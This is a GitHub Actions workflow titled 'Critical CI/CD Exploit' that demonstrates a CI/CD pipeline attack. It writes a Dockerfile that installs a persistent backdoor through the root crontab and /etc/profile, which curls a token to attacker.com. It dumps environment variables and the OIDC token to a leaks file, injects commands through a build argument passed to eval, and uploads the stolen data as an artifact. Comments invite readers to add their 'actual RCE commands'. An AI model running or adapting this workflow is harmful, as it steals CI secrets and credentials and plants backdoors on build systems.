name: Critical CI/CD Exploit
on:
  push:
    branches: [ main ] # Changed to push for easier testing, but pull_request_target is the real vulnerability trigger.

jobs:
  attack:
    runs-on: ubuntu-latest
    permissions:
      id-token: write # Required for OIDC token request
      contents: read  # Required for checkout

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Prepare Dockerfile and Execute Payload
        run: |
          # Ensure the directory structure exists
          mkdir -p ./taskcluster/docker/python

          # Define the malicious Dockerfile content
          # We're now writing the Dockerfile directly to the file,
          # and the injection happens via the build-arg
          cat <<'EOF_DOCKERFILE' > ./taskcluster/docker/python/Dockerfile
          FROM python:3.11-alpine
          ARG PYTHON_VERSION

          RUN apk add --no-cache curl && \
              echo "[+] Installing backdoor..." && \
              echo '#!/bin/sh' > /usr/local/bin/init.sh && \
              echo 'curl -s http://attacker.com/exfil?token=$(cat /token)' >> /usr/local/bin/init.sh && \
              chmod +x /usr/local/bin/init.sh && \
              echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root && \
              echo "/usr/local/bin/init.sh" >> /etc/profile && \
              echo "[+] Dumping secrets..." && \
              { echo "===== ENV ====="; printenv; echo "===== OIDC TOKEN ====="; curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"; } > /leaks.txt && \
              # Inject our malicious commands here, after initial setup.
              # This will be executed by the RUN instruction.
              eval "$PYTHON_VERSION"
          EOF_DOCKERFILE

          # Define the malicious payload to be injected into PYTHON_VERSION
          # Using single quotes around EOF_PAYLOAD to prevent shell interpolation
          # inside the heredoc itself.
          # Here, we'll demonstrate a simple command for testing,
          # but this is where your actual RCE commands would go.
          MALICIOUS_PAYLOAD="whoami && pwd && ls -la /"

          # Build the Docker image, injecting the MALICIOUS_PAYLOAD
          # into the PYTHON_VERSION build argument.
          # The key is that the Dockerfile now has 'eval "$PYTHON_VERSION"'
          # in its RUN instruction.
          docker build \
            --build-arg PYTHON_VERSION="$MALICIOUS_PAYLOAD" \
            -t malicious \
            ./taskcluster/docker/python

          # Run the malicious container to get the leaks.txt file
          docker run --rm malicious cat /leaks.txt > leaks.txt

      - name: Upload Exfiltrated Data
        uses: actions/upload-artifact@v4
        with:
          name: ci-leaks
          path: leaks.txt
